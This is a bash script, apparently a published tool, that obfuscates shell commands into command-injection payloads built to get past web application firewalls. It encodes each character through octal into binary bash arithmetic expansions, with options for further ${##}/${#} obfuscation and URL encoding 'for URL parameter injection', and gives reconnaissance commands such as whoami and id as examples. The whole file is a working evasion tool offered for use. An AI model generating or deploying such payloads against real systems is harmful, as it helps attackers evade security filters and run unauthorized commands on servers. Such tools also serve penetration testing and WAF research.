#!/usr/bin/env bash


set -euo pipefail
# enables strict mode:
# -e -> exit immediately if a command fails
# -u -> treat unset variables as an error
# -o pipefail -> Catch errors inside pipelines

# Configuration flag vars
DOUBLE_ENCODE=false
URL_ENCODE=false
USE_PID=false


# Help message
show_help() {
  echo -e "
\033[1;37;44mWAF BYPASSER COMMAND INJECTION OBFUSCATOR\033[0m
\033[38;5;255mASCII\033[0m --> \033[38;5;160mOctal\033[0m --> \033[38;5;46mBinary\033[0m (obase2)
Made by \033[1;34;49mrodricbr @ Github.com\033[0m


USAGE:
  ${0##*/} [OPTIONS] <command>

OPTIONS:
  --double-encode, -e  :: Replace 1/0 with \${##}/\${#} respectively
  --url-safe, -u       :: URL-encode \"#\" characters (replace with \"%23\")
  --use-pid, -p        :: Use \"\${!##-}\" instead of \"\${0##\-}\" (default since it supports more shells)
  --help, -h           :: Show this help message

EXAMPLES:
  ${0##*/} \"whoami\"
  ${0##*/} --double-encode \"ls -la\"
  ${0##*/} --url-safe --double-encode \"id\"
  ${0##*/} --use-pid --double-encode \"uname -a\"

OUTPUT VARIANTS:
  Default:  \${0##\-}<<<\$'\$((\$((1<<1))#...))'
  With --use-pid: \${!##-}<<<\$'\$((\$((1<<1))#...))'

NOTE:
  --url-safe is recommended for URL parameter injection
  --double-encode adds extra obfuscation layer
  --use-pid changes variable expansion method
"
  exit 0
}


# Argument flag parsing
while [[ $# -gt 0 ]]; do
  case $1 in
    --double-encode|-e) DOUBLE_ENCODE=true; shift ;;
    --url-safe|-u) URL_ENCODE=true; shift ;;
    --use-pid|-p) USE_PID=true; shift ;;
    --help|-h) show_help ;;
    *) break ;;
  esac
done

STRINGS_="$*"

[[ -z "$STRINGS_" ]]&& \
  echo -e "\033[31mError:\033[0m empty or null parameter." &&
  echo "Use --help for usage information." &&
  exit 1;


# Encoding functionn
encode_byte() {
  local ch=$1
  local dec=$(printf '%d' "'$ch")
  local oct=$(printf '%o' "$dec")
  local bin=$(printf '%08d' "$(bc <<< "obase=2;$oct")")

  if [[ "$DOUBLE_ENCODE" == true ]]; then
    local encoded_bin=""
    for (( j=0; j<${#bin}; j++ )); do
      local digit=${bin:j:1}
      if [[ "$digit" == "1" ]]; then
        encoded_bin+='${##}'
      else
        encoded_bin+='${#}'
      fi
    done # aq
    printf '\\\\$(($((${##}<<${##}))#%s))' "$encoded_bin"
  else
    printf '\\\\$(($((1<<1))#%s))' "$bin"
  fi
}

encode_word() {
  local word=$1
  local result=""
  for (( i=0; i<${#word}; i++ )); do
    result+=$(encode_byte "${word:i:1}")
  done
  printf '%s' "$result"
}


# Main function
main() {
  # selects which variable expansion method is set
  [[ "$USE_PID" == true ]]&& \
    var_expansion="\${!##-}" || \
    # vvv default expansion is ideal since it supports more shell environments
    var_expansion="\${0##\\-}";

  IFS=' ' read -ra words <<< "$STRINGS_"
  local payload=""

  if (( ${#words[@]} == 1 )); then
    payload="${var_expansion}<<<\$\\'"
    payload+=$(encode_word "${words[0]}")
    payload+="\\'"
  else
    payload="${var_expansion}<<<{\\\$\\'"
    for (( i=0; i<${#words[@]}; i++ )); do
      if (( i > 0 )); then
        payload+="\\',\\\$\\'"
      fi
      payload+=$(encode_word "${words[i]}")
    done
    payload+="\\'}"
  fi

  # url encodes "#" characters if -u flag is set
  [[ "$URL_ENCODE" == true ]] && \
    payload="${payload//#/%23}";

  printf '%s\n' "$payload"
}

main "$@"
